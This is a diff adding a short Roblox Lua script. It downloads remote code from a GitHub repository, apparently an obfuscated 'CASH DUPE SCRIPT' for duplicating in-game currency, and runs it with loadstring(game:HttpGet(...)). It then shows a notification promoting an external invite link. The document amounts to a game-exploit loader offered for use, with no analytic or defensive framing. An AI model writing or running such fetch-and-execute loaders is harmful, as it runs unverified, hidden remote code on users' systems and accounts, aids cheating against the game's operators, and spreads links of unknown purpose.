@@ -1,0 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmilerVinix/lua-obfuscator/refs/heads/main/Fixed%20-%20CASH%20DUPE%20SCRIPT", true))()
+
+task.wait(2)
+
+game.StarterGui:SetCore("SendNotification", {
+	Title = "yo";
+	Text = "https://invitelink.me/Dolta";
+	Duration = 10;
+	Button1 = "join it";
+})
